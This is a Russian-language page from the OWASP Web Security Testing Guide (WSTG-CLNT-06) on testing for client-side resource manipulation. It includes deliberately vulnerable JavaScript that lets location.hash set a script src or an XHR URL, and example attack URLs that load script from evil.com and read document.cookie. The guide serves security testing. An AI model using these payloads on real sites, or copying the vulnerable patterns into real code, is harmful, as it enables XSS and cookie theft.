---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование манипулирования ресурсами на стороне клиента

|ID          |
|------------|
|WSTG-CLNT-06|

## Обзор

Уязвимость, связанная с манипулированием ресурсами на стороне клиента, представляет собой недостаточный контроль ввода. Это происходит, когда приложение принимает входные данные, контролируемые пользователем, которые указывают путь к ресурсу, например, источнику iframe, JavaScript, апплету или обработчику XMLHttpRequest (XHR). Эта уязвимость заключается в возможности контролировать URL, которые ссылаются на ресурсы web-страницы. Влияние этой уязвимости может быть разным, обычно она применяется для проведения XSS-атак. Эта уязвимость позволяет вмешиваться в поведение приложения, заставляя его загружать и отображать вредоносные объекты.

В следующем коде JavaScript показан потенциально уязвимый скрипт, в котором злоумышленник может контролировать `location.hash` (источник), который связан с атрибутом `src` элемента скрипта. Данный пример приводит к XSS-атаке, поскольку допускает инъекцию внешнего JavaScript.

```html
<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>
```

Злоумышленник может нацелиться на жертву, заставив ее посетить URL:

`www.victim.com/#http://evil.com/js.js`

Где `js.js` содержит:

```js
alert(document.cookie)
```

Это приведет к появлению предупреждения в браузере жертвы.

Более опасный сценарий включает в себя возможность управления URL, вызываемым в запросе CORS. Поскольку CORS позволяет запрашивающему домену получать доступ к целевому ресурсу с помощью подхода, основанного на HTTP-заголовках, злоумышленник может заставить целевую страницу загрузить вредоносный контент со своего сайта.

Вот пример уязвимой страницы:

```html
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>
```

Ввод `location.hash` контролирует пользователь и использует его для запроса внешнего ресурса, который затем будет отражён через конструкцию `innerHTML`. Злоумышленник может заставить жертву перейти по следующему URL:

`www.victim.com/#http://evil.com/html.html`

где полезная нагрузка обрабатывается в `html.html`:

```html
<?php
header('Access-Control-Allow-Origin: http://www.victim.com');
?>
<script>alert(document.cookie);</script>
```

## Задачи тестирования

- Найти приёмники с недостаточной проверкой входных данных.
- Оценить влияние манипуляций с ресурсами.

## Как тестировать

Чтобы вручную проверить наличие уязвимостей такого типа, мы должны выяснить, насколько хорошо приложение контролирует входные данные. Если контроль недостаточный, то эти данные могут использоваться для указания внешних ресурсов. Поскольку приложение может включать множество ресурсов (например, изображения, видео, объекты, css и iframe), следует изучить клиентские скрипты, обрабатывающие связанные URL, на предмет потенциальных проблем.

В таблице ниже показаны возможные точки инъекции (приёмники), которые необходимо проверить:

| Тип ресурса   | Тег/метод                                | Приёмник   |
| --------------- | ----------------------------------------- | ------ |
| Фрейм           | iframe                                    | src    |
| Ссылка            | a                                         | href   |
| Запрос AJAX    | `xhr.open(method, [url], true);` | URL    |
| CSS             | link                                      | href   |
| Изображение           | img                                       | src    |
| Объект          | object                                    | data   |
| Скрипт          | script                                    | src    |

Наиболее интересными из них являются те, которые позволяют злоумышленнику включать код на стороне клиента (например, JavaScript), который может привести к уязвимостям XSS.
